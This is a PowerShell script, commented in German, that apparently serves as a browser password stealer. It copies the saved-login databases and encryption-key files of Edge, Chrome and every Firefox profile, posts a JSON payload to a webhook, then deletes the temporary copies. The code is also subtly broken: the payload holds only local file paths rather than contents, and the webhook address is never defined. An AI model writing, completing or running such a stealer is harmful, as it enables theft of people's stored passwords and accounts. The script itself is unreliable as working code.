# Logging-Funktion
function Write-Log {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Output "$timestamp - $message"
}

# Funktion zum Kopieren von Dateien und Senden von Daten
function Copy-And-Send {
    param (
        [string]$browserName,
        [string]$dbPath,
        [string]$masterKeyPath,
        [string]$profileName = ""
    )

    $tempDb = "$env:TEMP\${browserName}_${profileName}_Login Data"
    $tempMasterKey = "$env:TEMP\${browserName}_${profileName}_MasterKey"

    # Kopieren der Datenbank und des Masterkeys, um Sperren zu vermeiden
    if (Test-Path $dbPath) {
        Copy-Item $dbPath $tempDb -Force
        Write-Log "Copied database for $browserName ($profileName): $dbPath"
    } else {
        Write-Log "Database path not found for $browserName ($profileName): $dbPath"
        return
    }

    if (Test-Path $masterKeyPath) {
        Copy-Item $masterKeyPath $tempMasterKey -Force
        Write-Log "Copied master key for $browserName ($profileName): $masterKeyPath"
    } else {
        Write-Log "Master key path not found for $browserName ($profileName): $masterKeyPath"
        return
    }

    # JSON-Payload erstellen
    $JsonPayload = @{
        "browser" = $browserName
        "profile" = $profileName
        "dbPath" = $tempDb
        "masterKeyPath" = $tempMasterKey
    } | ConvertTo-Json

    # Daten an Webhook senden
    $Parameters = @{
        "Uri"         = $webhookUri
        "Method"      = "POST"
        "Body"        = $JsonPayload
        "ContentType" = "application/json"
    }

    try {
        Invoke-RestMethod @Parameters
        Write-Log "Sent data for $browserName ($profileName)"
    } catch {
        Write-Log "Failed to send data for $browserName ($profileName): $_"
    }

    # Temporäre Dateien löschen
    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    Remove-Item $tempMasterKey -Force -ErrorAction SilentlyContinue
}

# Pfade der Browser-Datenbanken und Masterkeys
$browserPaths = @{
    "Edge" = @{
        "dbPath" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        "masterKeyPath" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    }
    "Chrome" = @{
        "dbPath" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        "masterKeyPath" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    }
}

# Kopieren und Senden für jeden Browser außer Firefox
foreach ($browser in $browserPaths.Keys) {
    $paths = $browserPaths[$browser]
    Copy-And-Send -browserName $browser -dbPath $paths.dbPath -masterKeyPath $paths.masterKeyPath
}

# Spezielle Behandlung für Firefox
$firefoxProfileDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfileDir) {
    $profiles = Get-ChildItem -Path $firefoxProfileDir -Directory
    foreach ($profile in $profiles) {
        $profileName = $profile.Name
        $dbPath = "$profile\logins.json"
        $masterKeyPath = "$profile\key4.db"
        Copy-And-Send -browserName "Firefox" -dbPath $dbPath -masterKeyPath $masterKeyPath -profileName $profileName
    }
} else {
    Write-Log "Firefox profile directory not found: $firefoxProfileDir"
}

Write-Log "Script execution completed"